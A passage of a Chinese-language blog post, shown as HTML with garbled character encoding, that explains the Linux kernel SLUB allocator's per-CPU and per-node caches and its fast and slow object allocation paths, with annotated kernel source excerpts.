class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * When changing the layout, make sure freelist and tid are still compatible</span><br><span class="hljs-comment"> * with this_cpu_cmpxchg_double() alignment requirements.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> &#123;</span><br><span class="hljs-type">void</span> **freelist;<span class="hljs-comment">/* æŒ‡å‘ä¸‹ä¸€ä¸ªå¯ç”¨å¯¹è±¡çš„æŒ‡é’ˆ */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<span class="hljs-comment">/* Globally unique transaction id */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><span class="hljs-comment">/* ç”¨ä»¥å†…å­˜åˆ†é…çš„ slab */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">partial</span>;</span><span class="hljs-comment">/* Partially allocated frozen slabs */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">local_lock_t</span> lock;<span class="hljs-comment">/* Protects the fields above */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_STATS</span><br><span class="hljs-type">unsigned</span> stat[NR_SLUB_STAT_ITEMS];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>freelist</code>ï¼šæŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—²å¯¹è±¡çš„æŒ‡é’ˆ</li><li><code>slab</code>ï¼šå½“å‰ç”¨ä»¥è¿›è¡Œå†…å­˜åˆ†é…çš„ slab</li><li><code>partial</code>ï¼špercpu partial slab é“¾è¡¨ï¼Œé“¾è¡¨ä¸Šä¸ºä»æœ‰ä¸€å®šç©ºé—²å¯¹è±¡çš„ slab</li></ul><p>slab çš„ freelist ä»…å½“å…¶åœ¨ partial é“¾è¡¨ä¸Šæ—¶æœ‰ç”¨ï¼Œå½“ä¸€å¼  slab ä¸ºå½“å‰ CPU æ­£åœ¨ä½¿ç”¨çš„ slab æ—¶ï¼Œå…¶ freelist ä¸º NULLï¼Œç”± <code>kmem_cache_cpu.freelist</code> æŒ‡å‘ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡</p><p><img src="https://s2.loli.net/2023/02/21/xSLqghNZ23nCMiz.png" alt="image.png"></p><h2 id="å››ã€kmem-cache-nodeï¼šå„-node-åå¤‡å†…å­˜æ± "><a href="#å››ã€kmem-cache-nodeï¼šå„-node-åå¤‡å†…å­˜æ± " class="headerlink" title="å››ã€kmem_cache_nodeï¼šå„ node åå¤‡å†…å­˜æ± "></a>å››ã€kmem_cache_nodeï¼šå„ node åå¤‡å†…å­˜æ± </h2><p><strong>æ¯ä¸ª <a href="https://arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/#0x03-struct-pglist-data%EF%BC%9A%E8%8A%82%E7%82%B9">node</a> å¯¹åº”çš„åå¤‡å†…å­˜æ± </strong>ï¼Œå½“ percpu çš„ç‹¬å å†…å­˜æ± è€—å°½åä¾¿ä¼šä»å¯¹åº” node çš„åå¤‡å†…å­˜æ± å°è¯•åˆ†é…</p><blockquote><p>ä¸è¿‡å¤§éƒ¨åˆ†è®¡ç®—æœºéƒ½ä»…æœ‰ä¸€ä¸ª nodeï¼Œæ‰€ä»¥é€šå¸¸æƒ…å†µä¸‹æ¯ä¸ª <code>kmem_cache</code> ä¹Ÿå°±åªæœ‰ä¸€ä¸ª <code>kmem_cache_node</code>  ğŸ˜„</p></blockquote><p>å› ä¸ºæœ¬æ–‡ä¸»è¦è®² slubï¼Œæ‰€ä»¥ä»…æˆªå– slub ç›¸å…³å­—æ®µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLOB</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The slab lists for all objects.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB</span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB</span><br><span class="hljs-type">spinlock_t</span> list_lock;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_partial;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">partial</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span><br><span class="hljs-type">atomic_long_t</span> nr_slabs;<br><span class="hljs-type">atomic_long_t</span> total_objects;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">full</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>list_lock</code>ï¼šä¿æŠ¤ partial å’Œ full é“¾è¡¨çš„é”</li><li><code>partial</code>ï¼špartial slab é“¾è¡¨ï¼Œè¿æ¥<strong>æœ‰ç€éƒ¨åˆ†ç©ºé—²å¯¹è±¡å‰©ä½™çš„ slab</strong></li><li><code>nr_partial</code>ï¼špartial slab çš„æ•°é‡</li><li><code>full</code>ï¼šfull slab é“¾è¡¨ï¼Œè¿æ¥<strong>ç©ºé—²å¯¹è±¡å®Œå…¨è€—å°½çš„ slab</strong>ï¼ˆæ³¨ï¼šè¯¥é“¾è¡¨åŸºæœ¬ä¸Šä¸å¸¸ç”¨ï¼‰</li><li><code>nr_slabs</code>ï¼šæ€»çš„ slab æ•°é‡</li><li><code>total_objects</code>ï¼šæ€»çš„å¯¹è±¡æ•°é‡</li></ul><p><img src="https://s2.loli.net/2023/02/21/ECDOVtxAyiwd1UZ.png" alt="image.png"></p><h1 id="0x02-å¯¹è±¡çš„åˆ†é…"><a href="#0x02-å¯¹è±¡çš„åˆ†é…" class="headerlink" title="0x02. å¯¹è±¡çš„åˆ†é…"></a>0x02. å¯¹è±¡çš„åˆ†é…</h1><h2 id="â€»-ä¸€ã€slab-alloc-node-ï¼šä»æŒ‡å®šçš„-kmem-cache-åˆ†é…-object"><a href="#â€»-ä¸€ã€slab-alloc-node-ï¼šä»æŒ‡å®šçš„-kmem-cache-åˆ†é…-object" class="headerlink" title="â€» ä¸€ã€slab_alloc_node()ï¼šä»æŒ‡å®šçš„ kmem_cache åˆ†é… object"></a>â€» ä¸€ã€slab_alloc_node()ï¼šä»æŒ‡å®šçš„ kmem_cache åˆ†é… object</h2><p>åœ¨ slab allocator ä¸­å­˜åœ¨ç€å¤šä¸ªä¸åŒçš„å†…å­˜åˆ†é…æ¥å£ï¼Œå…¶æœ€åéƒ½ä¼šè°ƒç”¨åˆ° <code>slab_alloc_node()</code> å®Œæˆå†…å­˜åˆ†é…çš„å·¥ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å†…è”åŒ–çš„å¿«é€Ÿè·¯å¾„ä»¥è®©åˆ†é…å‡½æ•° (kmalloc, kmem_cache_alloc) ä¸­åŒ…å«å¿«é€Ÿè·¯å¾„.</span><br><span class="hljs-comment"> * å› æ­¤ï¼Œå¯¹äºå¿«é€Ÿè·¯å¾„å¯ä»¥æ»¡è¶³çš„è¯·æ±‚ï¼Œæ²¡æœ‰å‡½æ•°è°ƒç”¨çš„å¼€é”€.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å¿«é€Ÿè·¯å¾„é¦–å…ˆæ£€æŸ¥æ— é”çš„ç©ºé—²é“¾è¡¨æ˜¯å¦å¯ä»¥è¢«ä½¿ç”¨.</span><br><span class="hljs-comment"> * è‹¥å¦ï¼Œè°ƒç”¨ __slab_alloc è¿›è¡Œç¼“æ…¢å¤„ç†.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å¦åˆ™æˆ‘ä»¬å¯ä»¥ç®€å•åœ°ä»æ— é”ç©ºé—²é“¾è¡¨å–å‡ºä¸‹ä¸€ä¸ªå¯¹è±¡.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __fastpath_inline <span class="hljs-type">void</span> *<span class="hljs-title function_">slab_alloc_node</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> list_lru *lru,</span><br><span class="hljs-params"><span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">size_t</span> orig_size)</span><br>&#123;<br><span class="hljs-type">void</span> *object;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">obj_cgroup</span> *<span class="hljs-title">objcg</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">bool</span> init = <span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°é¦–å…ˆä¼šè°ƒç”¨ <code>slab_pre_alloc_hook()</code> è¿›è¡Œåˆ†é…å‰çš„æ£€æŸ¥å·¥ä½œï¼Œä¸é€šè¿‡åˆ™è¿”å› NULLï¼Œè¿™ä¸€æ­¥ä¸»è¦æ˜¯æ£€æŸ¥åˆ†é…æ ‡å¿—ä½æ˜¯å¦åˆæ³•ç­‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">s = slab_pre_alloc_hook(s, lru, &amp;objcg, <span class="hljs-number">1</span>, gfpflags);<br><span class="hljs-keyword">if</span> (!s)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è°ƒç”¨ <code>kfence_alloc()</code> è¿›è¡Œå†…å­˜é”™è¯¯æ£€æµ‹ï¼Œä¸é€šè¿‡åˆ™ç›´æ¥è·³è½¬åˆ° <code>out</code>ï¼Œè¿™é‡Œç”¨åˆ°äº† <em>Kfence (Kernel Electric Fence)</em>  å†…å­˜çº é”™æœºåˆ¶ï¼Œä¸»è¦æ˜¯æ£€æŸ¥å¯¹ <code>data page</code> çš„è®¿é—®æ˜¯å¦è¶Šç•Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">object = kfence_alloc(s, orig_size, gfpflags);<br><span class="hljs-keyword">if</span> (unlikely(object))<br><span class="hljs-keyword">goto</span> out;<br></code></pre></td></tr></table></figure><p><strong>æ¥ä¸‹æ¥è°ƒç”¨ <code>__slab_alloc_node()</code> è¿›è¡Œæ­£å¼çš„å†…å­˜åˆ†é…ï¼Œè¿™ä¸€æ­¥ä¾¿æ˜¯çœŸæ­£çš„æ ¸å¿ƒåˆ†é…å‡½æ•°</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">object = __slab_alloc_node(s, gfpflags, node, addr, orig_size);<br></code></pre></td></tr></table></figure><p>æœ€åè°ƒç”¨ <code>maybe_wipe_obj_freeptr()</code> å°† object åŸæœ¬å­˜æ”¾ next free object æŒ‡é’ˆçš„ä½ç½®æ¸…é›¶ï¼Œä¹‹åè°ƒç”¨ <code>slab_want_init_on_alloc()</code> æ£€æŸ¥æ ‡å¿—ä½æ˜¯å¦æœ‰ <code>__GFP_ZERO</code>ï¼Œè‹¥æœ‰åˆ™è°ƒç”¨ <code>slab_post_alloc_hook()</code> å°† object ä¸Šæ•°æ®æ¸…é›¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">maybe_wipe_obj_freeptr(s, object);<br>init = slab_want_init_on_alloc(gfpflags, s);<br><br>out:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å½“ init == &#x27;true&#x27;, ç±»ä¼¼ kzalloc() æ—, </span><br><span class="hljs-comment"> * ä»…æœ‰ @orig_size å­—èŠ‚ä¼šè¢«æ¸…é›¶ï¼Œè€Œé s-&gt;object_size</span><br><span class="hljs-comment"> */</span><br>slab_post_alloc_hook(s, objcg, gfpflags, <span class="hljs-number">1</span>, &amp;object, init, orig_size);<br><br><span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹çœŸæ­£çš„æ ¸å¿ƒåˆ†é…å‡½æ•° <code>__slab_alloc_node()</code></p><h3 id="I-slab-alloc-node-ï¼šä»-percpu-freelist-è¿›è¡Œåˆ†é…ï¼ˆfast-pathï¼‰"><a href="#I-slab-alloc-node-ï¼šä»-percpu-freelist-è¿›è¡Œåˆ†é…ï¼ˆfast-pathï¼‰" class="headerlink" title="I. __slab_alloc_node()ï¼šä» percpu freelist è¿›è¡Œåˆ†é…ï¼ˆfast pathï¼‰"></a>I. __slab_alloc_node()ï¼šä» percpu freelist è¿›è¡Œåˆ†é…ï¼ˆfast pathï¼‰</h3><p>è¯¥å‡½æ•°é¦–å…ˆä¼šå…ˆè·å– percpu çš„ <code>kmem_cache_cpu</code> ä¸Šçš„ freelist ä¸ slabï¼Œ<strong>è‹¥ slab æˆ– freelist ä¸ºç©º</strong> &#x2F; slab ä¸ node ä¸åŒ¹é…ï¼Œåˆ™è°ƒç”¨ <code>__slab_alloc()</code> åˆ†é…ä¸€å¼ æ–° slab å¹¶ä»å…¶ä¸­è·å–ä¸€ä¸ªç©ºé—²å¯¹è±¡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *__slab_alloc_node(<span class="hljs-keyword">struct</span> kmem_cache *s,<br><span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">size_t</span> orig_size)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> *<span class="hljs-title">c</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<br><span class="hljs-type">void</span> *object;<br><br>redo:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å¿…é¡»é€šè¿‡è¯¥ cpu ptr è¯»å– kmem_cache cpu æ•°æ®. æŠ¢å æ˜¯å¼€å¯çš„.</span><br><span class="hljs-comment"> * æˆ‘ä»¬å¯èƒ½ä¼šåœ¨ä»ä¸€ä¸ª cpu åŒºåŸŸè¯»å–æ—¶åœ¨ cpu é—´åˆ‡æ¢.</span><br><span class="hljs-comment"> * åªè¦æˆ‘ä»¬åœ¨ cmpxchg æ—¶åœ¨åŸæœ¬çš„ cpu ä¸Šé‡æ–°ç»“æŸä¾¿ä¸è¦ç´§.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æˆ‘ä»¬å¿…é¡»ä¿è¯ tid ä¸ kmem_cache_cpu è¢«åœ¨åŒä¸€ cpu ä¸Šå–å›.</span><br><span class="hljs-comment"> * æˆ‘ä»¬é¦–å…ˆè¯»å– kmem_cache_cpu æŒ‡é’ˆå¹¶ç”¨å…¶è¯»å– tid.</span><br><span class="hljs-comment"> * è‹¥æˆ‘ä»¬åœ¨ä¸¤æ¬¡è¯»å–é—´è¢«æŠ¢å å¹¶åˆ‡æ¢åˆ°å¦ä¸€ cpuï¼Œç”±äºè¿™ä¸¤è€…ä»ä¸åŒä¸€ cpu å…³è”ï¼Œ</span><br><span class="hljs-comment"> * cmpxchg ç¨åå°†ä¼šéªŒè¯ cpu ï¼Œè¿™æ˜¯ OK çš„.</span><br><span class="hljs-comment"> */</span><br>c = raw_cpu_ptr(s-&gt;cpu_slab);<br>tid = READ_ONCE(c-&gt;tid);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ­¤å¤„ä½¿ç”¨çš„æ— ä¸­æ–­ï¼ˆirqlessï¼‰ å¯¹è±¡åˆ†é…/é‡Šæ”¾ç®—æ³•å†³å®šäºè·å– cpu_slab æ•°æ®çš„é¡ºåº.</span><br><span class="hljs-comment"> * tid åº”å½“åœ¨åœ¨ c ä¸Šçš„ä»»ä½•äº‹ä¹‹å‰è¢«è·å–ä»¥ç¡®ä¿ä¸æ­¤å‰ tid å…³è”çš„å¯¹è±¡ä¸ slab</span><br><span class="hljs-comment"> * ä¸ä¼šè¢«ä¸å½“å‰ tid ä¸€èµ·ä½¿ç”¨. è‹¥æˆ‘ä»¬å…ˆè·å– tidï¼Œå¯¹è±¡ä¸ slab å¯èƒ½ä¼šä¸ä¸‹ä¸€ä¸ª tid </span><br><span class="hljs-comment"> * ç›¸å…³è”ï¼Œè€Œæˆ‘ä»¬çš„åˆ†é…/é‡Šæ”¾è¯·æ±‚ä¹Ÿå°†ä¼šå¤±è´¥.è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬ä¼šé‡è¯•æ‰€ä»¥æ²¡é—®é¢˜.</span><br><span class="hljs-comment"> */</span><br>barrier();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The transaction ids are globally unique per cpu and per operation on</span><br><span class="hljs-comment"> * a per cpu queueï¼ˆè¿™å¥ç¿»æˆä¸­æ–‡å’‹éƒ½ä¸é¡ºï¼Œç›´æ¥çœ‹åŸæ–‡å§ğŸ˜„ï¼‰.</span><br><span class="hljs-comment"> * ç”±æ­¤å¯ä»¥ç¡®ä¿ cmpxchg_double å‘ç”Ÿåœ¨æ­£ç¡®çš„å¤„ç†å™¨ä¸Šä¸”å…¶é—´åœ¨é“¾è¡¨ä¸Šæ²¡æœ‰ä»»ä½•æ“ä½œ.</span><br><span class="hljs-comment"> */</span><br><br>object = c-&gt;freelist;<br>slab = c-&gt;slab;<br><br><span class="hljs-keyword">if</span> (!USE_LOCKLESS_FAST_PATH() ||<br>    unlikely(!object || !slab || !node_match(slab, node))) &#123;<br>object = __slab_alloc(s, gfpflags, node, addr, c, orig_size);<br></code></pre></td></tr></table></figure><p>è‹¥æœ‰ freelist &amp; slubï¼Œåˆ™<strong>è°ƒç”¨ <code>get_freepointer_safe()</code> è·å–å½“å‰ç©ºé—²å¯¹è±¡ä¸‹ä¸€ä¸ªç©ºé—²å¯¹è±¡</strong>ï¼›æ¥ä¸‹æ¥ <code>this_cpu_cmpxchg_double()</code> ä¼šæ£€æŸ¥æ˜¯å¦ <code>freelist == object</code>ã€<code>cpu_slab-&gt;tid == tid</code>ï¼Œè‹¥æ˜¯åˆ™<strong>å°† freelist è®¾ä¸º next_object å¹¶è·å–è®¾ç½®ä¸‹ä¸€ tid</strong>ï¼Œå¦åˆ™è¯´æ˜å‘ç”Ÿäº†æŠ¢å ï¼ˆæˆ‘ä»¬å·²ç»ä¸åœ¨åŸ cpu ä¸Šäº†ï¼‰ï¼Œè·³è½¬å› <code>redo</code> é‡æ–°åœ¨å½“å‰ cpu ä¸Šè¿›è¡Œåˆ†é…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">void</span> *next_object = get_freepointer_safe(s, object);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä»…å½“æ²¡æœ‰é¢å¤–æ“ä½œä¸”æˆ‘ä»¬åœ¨æ­£ç¡®çš„å¤„ç†å™¨ä¸Šæ—¶ cmpxchg å°†åŒ¹é….</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * cmpxchg åŸå­åœ°è¿›è¡Œäº†å¦‚ä¸‹ï¼š (æ²¡æœ‰é”è¯­ä¹‰!)</span><br><span class="hljs-comment"> * 1. é‡å®šä½ç¬¬ä¸€ä¸ªæŒ‡é’ˆåˆ°å½“å‰çš„ per cpu åŒºåŸŸ.</span><br><span class="hljs-comment"> * 2. éªŒè¯ tid &amp; freelist æ²¡æœ‰è¢«æ”¹å˜</span><br><span class="hljs-comment"> * 3. è‹¥æœªè¢«æ”¹å˜ï¼Œæ›¿æ¢ tid &amp; freelist</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‡ªä»æ²¡æœ‰é”è¯­ä¹‰ï¼Œä¿æŠ¤ä»…éœ€è¦å¯¹æŠ—åœ¨è¯¥ cpu ä¸Šæ‰§è¡Œçš„ä»£ç *ä¸*ä»å…¶ä»–çš„ cpu ä¸Šè®¿é—®.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(<br>s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,<br>object, tid,<br>next_object, next_tid(tid)))) &#123;<br><br>note_cmpxchg_failure(<span class="hljs-string">&quot;slab_alloc&quot;</span>, s, tid);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åå¯¹äºç›´æ¥ä» cpu_slab ä¸Šåˆ†é…çš„å¯¹è±¡ä¼šé€šè¿‡ <code>prefetch_freepointer()</code> è°ƒç”¨ prefetchw æŒ‡ä»¤æå‰å°†å·²åˆ†é…å¯¹è±¡çš„åœ°å€è½½å…¥ç¼“å­˜ä¸­ï¼Œä¹‹åå°±æ˜¯è¿”å›åˆ†é…æˆåŠŸçš„ç©ºé—²å¯¹è±¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">prefetch_freepointer(s, next_object);<br>stat(s, ALLOC_FASTPATH);<br>&#125;<br><br><span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="II-slab-alloc-ï¼šè·å–å¦ä¸€-slab-è¿›è¡Œåˆ†é…ï¼ˆslow-pathï¼‰"><a href="#II-slab-alloc-ï¼šè·å–å¦ä¸€-slab-è¿›è¡Œåˆ†é…ï¼ˆslow-pathï¼‰" class="headerlink" title="II. ___slab_alloc()ï¼šè·å–å¦ä¸€ slab è¿›è¡Œåˆ†é…ï¼ˆslow pathï¼‰"></a>II. ___slab_alloc()ï¼šè·å–å¦ä¸€ slab è¿›è¡Œåˆ†é…ï¼ˆslow pathï¼‰</h3><p><code>__slab_alloc()</code> å…¶å®æ˜¯åœ¨å¼€å¯äº†æŠ¢å çš„æƒ…å†µä¸‹ï¼ˆé»˜è®¤å¼€å¯ï¼‰å¯¹ <code>___slab_alloc()</code> çš„ä¸€ä¸ªç®€å•çš„ wrapperï¼Œä¸»è¦å°±æ˜¯é‡æ–°è¯»å– <code>kmem_cache_cpu</code> çš„æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å½“æŠ¢å æ²¡æœ‰å…³é—­æ—¶ ___slab_alloc() ç”¨äºä¸Šä¸‹æ–‡çš„ wrapper.</span><br><span class="hljs-comment"> * é€šè¿‡é‡æ–°è·å– percpu åŒºåŸŸçš„æŒ‡é’ˆæ¥è¡¥å¿å¯èƒ½çš„ cpu æ›´æ”¹.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *__slab_alloc(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node,<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-keyword">struct</span> kmem_cache_cpu *c, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_size)<br>&#123;<br><span class="hljs-type">void</span> *p;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æˆ‘ä»¬å¯èƒ½å·²è¢«æŠ¢å ä¸”åœ¨å…³é—­æŠ¢å å‰è°ƒåº¦åˆ°äº†ä¸åŒçš„ cpu ä¸Š.</span><br><span class="hljs-comment"> * éœ€è¦é‡æ–°è½½å…¥ cpu åŒºåŸŸæŒ‡é’ˆ.</span><br><span class="hljs-comment"> */</span><br>c = slub_get_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>p = ___slab_alloc(s, gfpflags, node, addr, c, orig_size);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span><br>slub_put_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ <code>___slab_alloc()</code>ï¼Œè¯¥å‡½æ•°ä¾¿æ˜¯æ…¢é€Ÿåˆ†é…è·¯å¾„çš„æ ¸å¿ƒå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span 